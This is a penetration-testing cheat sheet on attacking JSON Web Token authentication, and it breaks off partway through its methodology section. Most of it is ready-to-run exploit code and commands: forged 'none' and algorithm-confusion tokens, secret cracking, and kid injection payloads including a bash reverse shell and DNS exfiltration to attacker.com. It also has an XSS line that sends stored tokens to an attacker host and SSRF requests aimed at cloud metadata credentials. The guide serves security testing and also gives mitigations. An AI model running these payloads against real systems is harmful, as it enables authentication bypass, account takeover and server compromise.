## Overview & Theory

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact, self-contained way to securely transmit information between parties as a JSON object. JWTs are commonly used for **stateless authentication** instead of traditional session cookies.

### Structure

A JWT consists of **three Base64URL-encoded parts** separated by dots (`.`):

```
header.payload.signature
```

**Example:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

#### 1. Header (JOSE Header)

Contains token metadata - algorithm and type:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Common algorithms:**

- **HS256/384/512**: HMAC + SHA (symmetric - same key signs & verifies)
- **RS256/384/512**: RSA + SHA (asymmetric - private key signs, public key verifies)
- **ES256/384/512**: ECDSA (asymmetric)
- **none**: No signature (dangerous if accepted)

**Optional header parameters:**

- `kid` (Key ID): Identifies which key to use
- `jku` (JWK Set URL): URL to JSON Web Key Set
- `jwk` (JSON Web Key): Embedded public key
- `x5u` (X.509 URL): URL to X.509 certificate
- `x5c` (X.509 Certificate Chain): Embedded certificate
- `x5t` (X.509 Thumbprint): Certificate SHA-1 thumbprint
- `cty` (Content Type): Indicates nested JWT

#### 2. Payload (Claims)

Contains the actual data/claims:

```json
{
  "sub": "1337",
  "name": "admin",
  "admin": true,
  "iat": 1516239022,
  "exp": 1516242622
}
```

**Registered claims:**

- `iss` (Issuer): Who issued the token
- `sub` (Subject): User identifier
- `aud` (Audience): Intended recipient
- `exp` (Expiration): When token expires
- `nbf` (Not Before): When token becomes valid
- `iat` (Issued At): When token was created
- `jti` (JWT ID): Unique token identifier

#### 3. Signature

Verifies integrity and authenticity:

```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

---

## Reconnaissance & Detection

### Finding JWTs

**Look for tokens in:**

- `Authorization: Bearer <token>`
- Cookies
- POST body parameters
- URL parameters
- Local/Session Storage (client-side JS)

**JWT characteristics:**

- Base64 string of 100+ characters
- Three parts separated by dots
- Starts with `eyJ` (base64 of `{"`)

**Burp Suite regex:**

```regex
[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*
[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*
```

### Decode & Analyze

**Online tools:**

- https://jwt.io
- https://token.dev

**Command line:**

```bash
# Decode header
echo "eyJhbGc..." | base64 -d

# Using jwt_tool
python3 jwt_tool.py <JWT>
```

**Check for:**

- Sensitive data in payload (passwords, keys, PII)
- Algorithm used (`alg`)
- Key identifiers (`kid`, `jku`, `x5u`)
- Expiration claims (`exp`, `nbf`)
- User role/permissions in claims

---

## Exploitation Methods

### 🎯 Quick Win - Automated Testing

**Run all attacks at once:**

```bash
# jwt_tool comprehensive scan
python3 jwt_tool.py -M at \
    -t "https://api.target.com/endpoint" \
    -rh "Authorization: Bearer <JWT>" \
    -cv "Success_String"
```

**Burp extensions:**

- JSON Web Token Attacker
- JWT Editor (by PortSwigger)
- JOSEPH
- SignSaboteur

---

### 1️⃣ None Algorithm Attack

**Impact:** Critical - Bypass signature validation entirely

**Vulnerability:** Server accepts `alg: none` and doesn't verify signature

**Steps:**

1. Decode the JWT
2. Change `alg` to `none` (try variants: `None`, `NONE`, `nOnE`)
3. Modify payload as needed
4. Remove signature (keep the trailing dot or remove it)
5. Re-encode and send

**Python exploit:**

```python
import jwt

old_token = 'eyJhbGc...'
payload = jwt.decode(old_token, options={"verify_signature": False})

# Modify payload
payload['admin'] = True

# Create new token with no signature
new_token = jwt.encode(payload, key='', algorithm=None)
print(new_token)
```

**Manual (jwt.io):**

1. Paste token in jwt.io
2. Change `"alg": "HS256"` → `"alg": "none"`
3. Edit payload
4. Remove signature section (everything after 2nd dot)

**jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -X a
```

**Test variations:**

```
none
None
NONE
nOnE
NoNe
```

---

### 2️⃣ Algorithm Confusion (RS256 → HS256)

**Impact:** Critical - Sign tokens using public key

**Vulnerability:** Server uses same key for both RS256 and HS256, allowing you to sign with the public RSA key as an HMAC secret

**Attack flow:**

1. Server expects RS256 (asymmetric)
2. You change `alg` to HS256 (symmetric)
3. Sign with the **public key** as the HMAC secret
4. Server validates using public key → accepts your forged token

**Steps:**

**Extract public key:**

```bash
# From server certificate
openssl s_client -connect target.com:443 2>&1 < /dev/null | \
  sed -n '/-----BEGIN/,/-----END/p' > cert.pem
openssl x509 -pubkey -in cert.pem -noout > pubkey.pem

# Or convert to hex for alternate libraries
cat pubkey.pem | xxd -p | tr -d "\\n" > hex.txt
```

**Python exploit:**

```python
import jwt

# WARNING: Use jwt==0.4.3 (pip install pyjwt==0.4.3)
# Newer versions prevent this attack

old_token = 'eyJhbGc...'
payload = jwt.decode(old_token, options={"verify_signature": False})

# Modify payload
payload['role'] = 'admin'

# Read public key
with open('pubkey.pem', 'r') as f:
    public_key = f.read()

# Sign using public key as HMAC secret
new_token = jwt.encode(payload, key=public_key, algorithm='HS256')
print(new_token)
```

**jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem
```

**JOSEPH (Burp):**

1. Send request to Repeater
2. Go to "JWS" tab
3. Select "Key Confusion Attack"
4. Load public key PEM file
5. Update & send

---

### 3️⃣ Weak HMAC Secret Cracking

**Impact:** Critical - Full token forgery capability

**Vulnerability:** Weak/predictable secret key used for HS256/384/512

**Dictionary Attack:**

```bash
# Hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show

# John the Ripper
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py <JWT> -C -d rockyou.txt

# jwtcrack
python crackjwt.py <JWT> /usr/share/wordlists/rockyou.txt
```

**Brute Force Attack:**

```bash
# Hashcat (6-8 lowercase chars)
hashcat -a 3 -m 16500 jwt.txt ?l?l?l?l?l?l?l?l -i --increment-min=6

# c-jwt-cracker (numeric 8 digits)
./jwtcrack <JWT> 1234567890 8

# jwt-cracker (alphanumeric 6 chars)
jwt-cracker "<JWT>" "abcdefghijklmnopqrstuvwxyz" 6
```

**Once cracked:**

```bash
# Forge new token with jwt_tool
python3 jwt_tool.py <JWT> -T -p "cracked_secret"

# Or with Python
import jwt
payload = {'user': 'admin', 'role': 'administrator'}
token = jwt.encode(payload, 'cracked_secret', algorithm='HS256')
```

**Common weak secrets to try:**

```
secret
admin
password
123456
your_secret_key
jwt_secret
api_secret
```

---

### 4️⃣ Kid (Key ID) Exploits

**Impact:** High to Critical depending on exploit

#### A. Path Traversal

**Vulnerability:** `kid` parameter used to load key file from filesystem without sanitization

**Exploit null byte file:**

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**Python:**

```python
import jwt
payload = {'user': 'admin'}
token = jwt.encode(
    payload, 
    key='',  # empty key for /dev/null
    algorithm='HS256', 
    headers={"kid": "../../../dev/null"}
)
```

**Predictable file content:**

```bash
# /proc/sys/kernel/randomize_va_space (contains "2")
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../proc/sys/kernel/randomize_va_space" -S hs256 -p "2"

# Any static config file
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../etc/hostname" -S hs256 -p "$(cat /etc/hostname)"
```

**Other predictable files:**

```
/proc/sys/kernel/ftrace_enabled (0 or 1)
/etc/host.conf
/etc/xattr.conf
Static JS/CSS files in webroot
/var/www/html/static/file.js
```

#### B. SQL Injection

**Vulnerability:** `kid` used in SQL query to fetch key

**Payloads:**

```python
# Union-based
kid = "non-existent' UNION SELECT 'mykey';--"
kid = "1' UNION SELECT 'ATTACKER';-- -"

# Boolean-based
kid = "1' AND '1'='1"
kid = "1' AND SLEEP(5)--"
```

**Python exploit:**

```python
import jwt
payload = {'user': 'admin'}
# Use known secret that will be returned by UNION
token = jwt.encode(
    payload,
    key='ATTACKER',
    algorithm='HS256',
    headers={"kid": "xxx' UNION SELECT 'ATTACKER';--"}
)
```

**jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem
```

#### C. Command Injection

**Vulnerability:** `kid` passed to system command

**Payloads:**

```bash
# Exfiltrate via DNS
kid = "key.crt; nslookup $(whoami).attacker.com"
kid = "key.crt; dig $(id|base64).attacker.com"

# Start HTTP server to leak keys
kid = "/root/keys/secret.key; cd /root/keys/ && python -m SimpleHTTPServer 1337&"

# Reverse shell
kid = "key.crt; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

---

### 5️⃣ JKU (JWK Set URL) Spoofing

**Impact:** Critical - Host your own key, sign your own tokens

**Vulnerability:** Server fetches keys from URL in `jku` parameter without validation

**Steps:**

1. **Generate your key pair:**

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

2. **Extract n and e parameters:**

```python
from Crypto.PublicKey import RSA

with open("publickey.crt", "r") as f:
    key = RSA.importKey(f.read())

print("n:", hex(key.n))
print("e:", hex(key.e))
```

3. **Create jwks.json:**

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "<base64_n_value>",
      "e": "AQAB"
    }
  ]
}
```

4. **Host it:**

```bash
# Python
python3 -m http.server 8000

# Or use repl.it, Burp Collaborator, ngrok
ngrok http 8000
```

5. **Forge token:**

```python
import jwt

payload = {'user': 'admin', 'role': 'administrator'}
with open('pkcs8.key', 'r') as f:
    private_key = f.read()

token = jwt.encode(
    payload,
    private_key,
    algorithm='RS256',
    headers={"jku": "http://attacker.com:8000/jwks.json"}
)
```

**jwt_tool:**

```bash
# Update jwtconf.ini with your JWK URL first
python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwks.json"
```

---

### 6️⃣ X5U (X.509 URL) Exploit

**Impact:** Critical - Similar to JKU but with X.509 certificates

**Steps:**

1. **Create self-signed certificate:**

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout attacker.key -out attacker.crt \
  -subj "/C=US/O=Evil/CN=attacker.com"

# Extract public key
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```

2. **Host certificate:**

```bash
python3 -m http.server 8000
# Certificate available at http://attacker.com:8000/attacker.crt
```

3. **Forge token:**

```python
import jwt

payload = {'user': 'admin'}
with open('attacker.key', 'r') as f:
    private_key = f.read()

token = jwt.encode(
    payload,
    private_key,
    algorithm='RS256',
    headers={"x5u": "http://attacker.com:8000/attacker.crt"}
)
```

**jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -S rs256 -pr private.pem \
  -I -hc x5u -hv "https://attacker.com/attacker.crt"
```

---

### 7️⃣ X5C (Embedded Certificate) Exploit

**Impact:** Critical - Embed your own certificate in token

**Steps:**

1. **Create self-signed cert:**

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout attacker.key -out attacker.crt
```

2. **Extract parameters:**

**Get n (modulus):**

```bash
openssl x509 -in attacker.crt -text
# Copy modulus value, then:
echo "<modulus_with_colons>" | sed 's/://g' | base64 | tr '\n' ' ' | sed 's/ //g' | sed 's/=//g'
```

**Get e (exponent - usually 65537):**

```bash
echo "10001" | base64 | sed 's/=//g'
# Result: AQAB
```

**Get x5c value:**

```bash
cat attacker.crt | tr '\n' ' ' | sed 's/ //g'
# Copy everything between BEGIN and END CERTIFICATE
```

**Get x5t (thumbprint):**

```bash
echo -n $(openssl x509 -in attacker.crt -fingerprint -noout) | \
  sed 's/SHA1 Fingerprint=//g' | sed 's/://g' | base64 | sed 's/=//g'
```

3. **Forge token with all parameters:**

- Use jwt.io
- Paste extracted values for n, e, x5c, x5t
- Set kid = x5t
- Sign with your private key

---

### 8️⃣ JWK (Embedded Key) Injection (CVE-2018-0114)

**Impact:** Critical - Embed your own public key in header

**Vulnerability:** Server trusts public key embedded in JWT header

**Steps:**

1. **Generate key pair:**

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

2. **Extract n and e:**

```javascript
// Node.js script
const NodeRSA = require('node-rsa');
const fs = require('fs');

const keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const pub = key.exportKey('components-public');

console.log('n:', pub.n.toString("hex"));
console.log('e:', pub.e.toString(16));
```

3. **Forge token with embedded JWK:**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "n": "<base64url_n_value>",
    "e": "AQAB"
  }
}
```

Use jwt.io with your private key to sign.

---

### 9️⃣ Signature Stripping / Not Checked

**Impact:** Critical - Payload tampering without valid signature

**Test 1: Remove signature entirely**

```bash
# Keep header and payload, remove signature
eyJhbGc...header...GVCJ9.eyJzdWI...payload...9dfQ.
```

**Test 2: Keep signature but modify payload**

```python
import jwt

token = 'eyJhbGc...'
payload = jwt.decode(token, options={"verify_signature": False})
payload['role'] = 'admin'

# Re-encode but keep old signature
parts = token.split('.')
import base64, json
new_payload = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

tampered_token = f"{parts[0]}.{new_payload}.{parts[2]}"
```

**jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -I -pc role -pv "admin"
```

---

### 🔟 Disclosure of Correct Signature (Error Oracle)

**Impact:** Medium - Reveals valid signature in error messages

**Vulnerability:** Error messages leak expected signature

**Test:**

```bash
# Modify payload, send request
# If error shows:
"Invalid signature. Expected ABC123... got XYZ789..."
```

Use the disclosed signature to craft valid tokens.

**CVE:** CVE-2019-7644

---

### 1️⃣1️⃣ Expiration Bypass

**Impact:** Medium - Token reuse/replay

**Tests:**

**A. Token never expires:**

```bash
# Use token after logout
# Wait 24+ hours and test again
```

**B. `exp` claim not validated:**

```python
import jwt, time

payload = {
    'user': 'admin',
    'exp': int(time.time()) - 3600  # Expired 1 hour ago
}
token = jwt.encode(payload, 'secret', algorithm='HS256')
# If accepted, exp is not checked
```

**C. `nbf` (not before) bypass:**

```python
payload = {
    'user': 'admin',
    'nbf': int(time.time()) + 3600  # Valid 1 hour from now
}
# If accepted now, nbf is not validated
```

---

### 1️⃣2️⃣ ECDSA Nonce Reuse (ES256/384/512)

**Impact:** Critical - Recover private key

**Vulnerability:** Same nonce used to sign two different tokens

**Requirements:**

- Two JWTs signed with same nonce
- Algorithm: ES256, ES384, or ES512

**Tool:**

```bash
# JWT-Key-Recovery
git clone https://github.com/FlorianPicca/JWT-Key-Recovery
python3 recover_key.py token1.txt token2.txt
```

Once private key is recovered, forge any token.

---

### 1️⃣3️⃣ Cross-Service Relay Attack

**Impact:** High - Use token from Service A on Service B

**Vulnerability:** Multiple services trust same JWT issuer but don't validate `aud` (audience)

**Test:**

1. Register on service A (e.g., app1.example.com)
2. Capture JWT token
3. Replay token on service B (e.g., app2.example.com)
4. Check if accepted

**Missing checks:**

- `aud` claim validation
- `iss` claim validation
- Service-specific claims

---

### 1️⃣4️⃣ JTI Replay Attack

**Impact:** Medium - Replay protection bypass

**Vulnerability:** `jti` (JWT ID) claim not tracked properly

**Scenario:**

- JTI max length is 4 digits (0001-9999)
- Request 0001 and 10001 share same JTI (collision)

**Test:**

```bash
# Use same token multiple times
# If JTI is 0001, send 10000 requests, then reuse token (now JTI=0001 again)
```

---

### 1️⃣5️⃣ Timing Attack

**Impact:** Low/Medium - Slow signature disclosure

**Vulnerability:** Signature compared byte-by-byte, fails fast

**Process:**

1. Brute force signature byte-by-byte
2. Measure response time
3. Correct byte = slightly longer response
4. Repeat for each byte

**Not practical in most scenarios** but theoretically possible.

---

## Bypasses & Evasion

### Algorithm Case Variations

```
none, None, NONE, nOnE, NoNe, noNe, nONE, NonE
```

### Empty Secret

```python
jwt.encode(payload, '', algorithm='HS256')
jwt.encode(payload, None, algorithm='HS256')
```

### Null Byte in Kid

```json
{"kid": "../../../dev/null"}
{"kid": "\u0000"}
```

### Special Characters in Claims

```python
payload = {
    'username': 'admin\u0000',
    'role': 'user\r\nadmin'
}
```

---

## Payloads

### Top 10 Modern JWT Attack Payloads

**1. None Algorithm with Admin Claim**

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.
```

**2. Kid Path Traversal to /dev/null**

```json
{"alg":"HS256","kid":"../../../dev/null"}
```

**3. Kid SQL Injection Union**

```json
{"alg":"HS256","kid":"xxx' UNION SELECT 'secretkey';--"}
```

**4. Kid Command Injection with DNS Exfil**

```json
{"alg":"HS256","kid":"key;nslookup $(whoami).attacker.com"}
```

**5. JKU Header Pointing to Attacker Server**

```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
```

**6. X5U Header with Malicious Certificate**

```json
{"alg":"RS256","x5u":"https://attacker.com/malicious.crt"}
```

**7. Algorithm Confusion RS256→HS256**

```json
{"alg":"HS256","typ":"JWT"}
// Signed with server's public RSA key as HMAC secret
```

**8. Embedded JWK with Attacker's Public Key**

```json
{
  "alg":"RS256",
  "jwk":{
    "kty":"RSA",
    "n":"<attacker_public_n>",
    "e":"AQAB"
  }
}
```

**9. Expired Token (exp Bypass)**

```json
{"user":"admin","exp":1234567890,"iat":9999999999}
```

**10. Empty Signature with Modified Payload**

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
```

---

## Higher Impact Scenarios

### 🎯 Admin Account Takeover

1. Crack/bypass JWT signature
2. Change `role` or `is_admin` claim to `true`/`admin`
3. Access admin panel

### 🎯 Authentication Bypass

1. Use `none` algorithm
2. Set `user` claim to target user
3. Access authenticated endpoints without password

### 🎯 Privilege Escalation

1. Modify claims: `role`, `permissions`, `scope`, `groups`
2. Escalate to admin/superuser

### 🎯 API Key Extraction

- Check payload for `api_key`, `secret`, `token` fields
- Often exposed in decoded JWT

### 🎯 Full Account Takeover via Kid RCE

1. Inject command in `kid` parameter
2. Exfiltrate `/etc/passwd`, database creds, or AWS keys
3. Pivot to server compromise

### 🎯 SSRF via JKU/X5U

```json
{"jku":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"x5u":"http://localhost:8080/admin"}
```

### 🎯 Mass Account Access (Weak Secret)

1. Crack JWT secret
2. Forge tokens for any user
3. Enumerate user IDs and access accounts at scale

---

## Tools & Resources

### Essential Tools

**jwt_tool** ⭐ (Must-have)

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py -h

# Quick test
python3 jwt_tool.py -M at -t "https://api.com" -rh "Authorization: Bearer TOKEN"
```

**Burp Extensions:**

- JSON Web Tokens (by Portswigger)
- JWT Editor (by Portswigger) ⭐
- JOSEPH
- SignSaboteur

**Cracking Tools:**

- Hashcat
- John the Ripper
- c-jwt-cracker
- jwt-cracker
- jwtcrack

**Python Libraries:**

```bash
pip install pyjwt==0.4.3  # For algorithm confusion
pip install pyjwt         # Latest for general use
```

### Quick Commands Cheat Sheet

```bash
# Decode
echo "TOKEN" | cut -d'.' -f2 | base64 -d | jq

# Crack secret
hashcat -a 0 -m 16500 token.txt rockyou.txt

# None algorithm
python3 jwt_tool.py TOKEN -X a

# RS256→HS256
python3 jwt_tool.py TOKEN -S hs256 -k public.pem

# Kid null byte
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Tamper with known secret
python3 jwt_tool.py TOKEN -T -p "secret"

# All attacks
python3 jwt_tool.py TOKEN -M at -t "URL" -rh "Authorization: Bearer TOKEN"
```

---

## Mitigations & Secure Implementation

### ✅ For Developers

**Always:**

- Use strong, random secrets (32+ bytes)
- Validate signature on every request
- Reject `alg: none`
- Use short expiration times (15-60 minutes)
- Implement `jti` properly for one-time use
- Validate `iss`, `aud`, `exp`, `nbf` claims
- Use allow-lists for `kid`, `jku`, `x5u`
- Never put secrets in payload
- Use latest JWT libraries
- Prefer RS256/ES256 over HS256 for services
- Implement rate limiting on endpoints

**Never:**

- Use weak secrets (password, secret, etc.)
- Trust header parameters without validation
- Allow `alg: none` in production
- Skip signature verification
- Use same key across multiple services
- Expose detailed error messages
- Let tokens live forever

### 🔍 Testing Checklist

- [ ] Decode JWT and check for sensitive data
- [ ] Test `alg: none` variations
- [ ] Test algorithm confusion (RS256→HS256)
- [ ] Attempt to crack HMAC secret
- [ ] Test `kid` parameter: path traversal, SQLi, command injection
- [ ] Test `jku`, `x5u`, `x5c`, `jwk` header injection
- [ ] Remove/modify signature and test
- [ ] Check if token expires (`exp` claim)
- [ ] Test token reuse after logout
- [ ] Test cross-service token replay
- [ ] Check for timing attacks on signature validation
- [ ] Verify `aud`, `iss` claims are validated
- [ ] Test ECDSA nonce reuse (if ES256/384/512)

---

## References & Further Reading

**Standards:**

- RFC 7519: JWT Specification
- RFC 7515: JSON Web Signature (JWS)
- RFC 7516: JSON Web Encryption (JWE)
- RFC 7517: JSON Web Key (JWK)
- RFC 7518: JSON Web Algorithms (JWA)

**Security Resources:**

- https://portswigger.net/web-security/jwt
- https://jwt.io
- https://attack.mitre.org/techniques/T1550/001/
- https://tools.ietf.org/id/draft-ietf-oauth-jwt-bcp-02.html

**CVEs:**

- CVE-2015-9235 (None algorithm)
- CVE-2016-10555 (Algorithm confusion)

- CVE-2016-5431 (RS256 to HS256)
- CVE-2018-0114 (JWK header injection)
- CVE-2018-1000531 (Signature verification bypass)
- CVE-2019-7644 (Signature disclosure in errors)

**Research Papers & Articles:**

- [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [Practical Cryptanalysis of Json Web Token and Galois Counter Mode](https://rwc.iacr.org/2017/Slides/nguyen.quan.pdf)
- [Attacking JSON Web Tokens (JWTs)](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [JWT Security Cheat Sheet](https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf)
- [Critical Vulnerability Uncovered in JSON Encryption](https://web.archive.org/web/20201130103442/https://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in-json-encryption.html)

**Write-ups & Lab Resources:**

- PortSwigger JWT Labs: https://portswigger.net/web-security/jwt
- PentesterLab JWT Exercises
- HackTheBox JWT challenges
- TokenLab: https://jwt-lab.herokuapp.com/challenges
- OWASP JWT Cheat Sheet

---

## Advanced Exploitation Scenarios

### 🔥 JWE (JSON Web Encryption) Attacks

**Background:** JWE encrypts JWT payload for confidentiality (rare in practice)

**Structure:**

```
header.encrypted_key.iv.ciphertext.auth_tag
```

**Attacks:**

**1. Weak Encryption Algorithms**

- Look for deprecated algorithms: `RSA1_5`, `dir`
- ECDH-ES implementation flaws can leak private keys

**2. Algorithm Downgrade**

- Similar to JWS, try changing `alg` to weaker options
- Test `dir` (direct key agreement - no key encryption)

**3. Invalid Curve Attack (ECDH-ES)**

- Exploit incorrect implementation to recover private key
- Requires multiple token exchanges

**4. Galois Counter Mode (GCM) Nonce Reuse**

- If same nonce used twice with GCM, can recover plaintext
- Requires capturing multiple JWE tokens

**Tools:**

- https://github.com/justsmth/jwe-attack

---

### 🔥 Token Confusion Attacks

**Scenario 1: OAuth Access Token vs JWT**

Some applications accept both:

- OAuth opaque tokens (validated via introspection endpoint)
- JWTs (validated locally)

**Exploit:** Send JWT when OAuth token expected or vice versa

**Scenario 2: Different JWT Types**

Applications may use:

- ID tokens (authentication)
- Access tokens (authorization)
- Refresh tokens

**Exploit:** Try using ID token where access token expected

---

### 🔥 Audience Confusion

**Vulnerability:** Multiple microservices trust same issuer but don't validate `aud`

**Example:**

```json
// Token from service A
{"iss":"auth.example.com","sub":"user123","aud":"service-a.example.com"}

// Try on service B (should reject but might accept)
```

**Test:**

1. Register on multiple services using same identity provider
2. Capture tokens from each
3. Cross-replay tokens between services

---

### 🔥 JTI Bypass Techniques

**Technique 1: JTI Overflow**

```python
# If JTI is numeric with max 9999
# Use token with JTI=1
# After 9999 requests, JTI resets to 1
# Original token becomes valid again
```

**Technique 2: JTI Race Condition**

```bash
# Send same token in multiple parallel requests
# Before server records JTI in blacklist
curl -X POST url -H "Authorization: Bearer TOKEN" &
curl -X POST url -H "Authorization: Bearer TOKEN" &
curl -X POST url -H "Authorization: Bearer TOKEN" &
```

---

### 🔥 Version Claim Exploitation

**Some libraries include `ver` claim:**

```json
{"ver":"1.0","user":"victim"}
```

**Attack:**

- Downgrade to older version with known vulnerabilities
- Change `ver` to `0.9` if version 0.9 had weaker validation

---

### 🔥 Client-Side Token Decode Vulnerabilities

**Scenario:** Application decodes JWT in JavaScript for UI logic

**Risks:**

1. **Logic flaws based on claims:**

```javascript
// Bad code
const token = localStorage.getItem('jwt');
const payload = JSON.parse(atob(token.split('.')[1]));
if(payload.role === 'admin') {
    showAdminPanel();
}
```

2. **XSS to steal tokens:**

```javascript
<script>
fetch('https://attacker.com/?jwt='+localStorage.getItem('jwt'));
</script>
```

3. **Token fixation:**

```javascript
// Attacker sets victim's JWT in localStorage
localStorage.setItem('jwt', 'attacker_controlled_token');
```

---

## Real-World Examples & Case Studies

### 📖 Case Study 1: Hackerone Report #896649

**Target:** smena.samokat.ru  
**Vulnerability:** Predictable JWT secret  
**Impact:** Full account takeover

**Details:**

- HMAC secret was `secret`
- Attacker cracked it using dictionary attack
- Forged admin tokens
- Accessed all user accounts

**Bounty:** $500

---

### 📖 Case Study 2: Trint Ltd (Hackerone #638635)

**Target:** Zendesk SSO Integration  
**Vulnerability:** JKU header not validated  
**Impact:** Authentication bypass

**Details:**

- Application fetched keys from `jku` URL
- Attacker hosted own JWK Set
- Changed `jku` to attacker URL
- Signed token with attacker's private key
- Bypassed SSO authentication

**Bounty:** $2,500

---

### 📖 Case Study 3: HackerOne Jira Plugin (#1103582)

**Target:** HackerOne's Jira integration  
**Vulnerability:** Algorithm confusion (RS256→HS256)  
**Impact:** Privilege escalation

**Details:**

- Plugin used same key for RS256 and HS256
- Attacker extracted public RSA key
- Changed algorithm to HS256
- Signed with public key as HMAC secret
- Escalated to admin access

**Bounty:** $5,000

---

### 📖 Case Study 4: Mail.ru (Similar Pattern)

**Vulnerability:** Kid path traversal + weak validation  
**Impact:** Authentication bypass

**Details:**

```json
{"kid":"../../../../dev/null"}
```

- Signed with empty secret
- Server validated against /dev/null content (empty)
- Any token with empty signature accepted

---


## Attack Flow Decision Tree

```
START: Found JWT token
    |
    ├─> Decode & analyze
    |    ├─> Contains secrets/PII? → Report
    |    ├─> Check algorithm (alg)
    |    ├─> Check expiration (exp)
    |    └─> Check claims (role, admin, etc.)
    |
    ├─> Test signature validation
    |    ├─> Remove signature → Accepted? → CRITICAL
    |    ├─> Modify payload + keep signature → Accepted? → CRITICAL
    |    └─> Send after logout → Accepted? → Token never expires (MEDIUM)
    |
    ├─> Test None algorithm
    |    ├─> alg: none → Accepted? → CRITICAL
    |    ├─> alg: None → Try all case variations
    |    └─> alg: NONE
    |
    ├─> Test Algorithm Confusion
    |    ├─> RS256 → HS256 + public key → CRITICAL
    |    └─> Extract public key from cert/JWK
    |
    ├─> Crack HMAC secret (if HS256/384/512)
    |    ├─> Dictionary attack → Success? → CRITICAL
    |    └─> Brute force (if time permits)
    |
    ├─> Test Header Injection
    |    ├─> kid present?
    |    |    ├─> Path traversal (/dev/null) → CRITICAL
    |    |    ├─> SQL injection → HIGH
    |    |    └─> Command injection → CRITICAL
    |    |
    |    ├─> jku present?
    |    |    ├─> Point to attacker URL → CRITICAL
    |    |    └─> SSRF to internal → HIGH
    |    |
    |    ├─> x5u present?
    |    |    ├─> Point to malicious cert → CRITICAL
    |    |    └─> SSRF to metadata → HIGH
    |    |
    |    ├─> x5c present? → Inject attacker cert → CRITICAL
    |    |
    |    └─> jwk present? → Embed attacker public key → CRITICAL
    |
    ├─> Test Claims Validation
    |    ├─> exp: Set to past → Accepted? → Missing expiration check
    |    ├─> nbf: Set to future → Accepted? → Missing not-before check
    |    ├─> aud: Change to other service → Accepted? → Missing audience check
    |    └─> iss: Change issuer → Accepted? → Missing issuer check
    |
    └─> Test for Logic Flaws
         ├─> Modify role/permissions claims
         ├─> Test cross-service token relay
         ├─> Test JTI replay
         └─> Check for client-side validation only
```

---

## Methodology Workflow

### Phase 1: Discovery (10 minutes)

```bash
# 1. Find JWT tokens
grep -r "eyJ" burp_history.txt
grep -r "Authorization: Bearer" burp_history.txt

# 2. Decode and analyze
python3 jwt_tool.py <TOKEN>

# 3. Check for sensitive data
echo "<payload_part>" | base64 -d | jq

# 4. Identify algorithm and claims
```

### Phase 2: Quick Wins (15 minutes)

```bash
# Run automated attacks
python3 jwt_tool.py -M at -t "<URL>" -rh "Authorization: Bearer <TOKEN>"

# Test common attacks
python3 jwt_tool.py <TOKEN> -X a  # None algorithm
python3 jwt_tool.py <TOKEN> -X k -pk public.pem  # Algorithm confusion

# Test signature removal
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin  # Modify without re-signing
```

### Phase 3: Secret Cracking (30 minutes - 2 hours)

```bash
# Dictionary attack
hashcat -a 0 -m 16500 token.txt rockyou.txt

# If weak secret found
python3 jwt_tool.py <TOKEN> -T -p "<cracked_secret>"
```

### Phase 4: Header Parameter Exploitation (20 minutes)

```bash
# Kid path traversal
